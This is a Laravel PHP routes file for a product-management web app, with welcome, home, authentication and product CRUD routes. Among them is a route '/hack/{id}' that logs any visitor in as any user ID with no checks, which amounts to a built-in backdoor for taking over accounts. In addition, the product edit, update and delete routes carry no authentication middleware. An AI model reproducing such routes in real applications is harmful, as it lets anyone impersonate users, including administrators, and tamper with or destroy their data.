<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Route::get("/hack/{id}", function($id){
    auth()->loginUsingId($id);
    return redirect('/');
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');

Route::get('/products', 'ProductController@index')->middleware('auth');
Route::get('/products/create', 'ProductController@create')->middleware('auth');
Route::post('/products', 'ProductController@store')->middleware('auth');
Route::get('/products/{product}', 'ProductController@show');
Route::get('/products/{product}/edit', 'ProductController@edit');
Route::put('/products/{product}/update', 'ProductController@update');
Route::delete('/products/{product}/delete', 'ProductController@destroy');
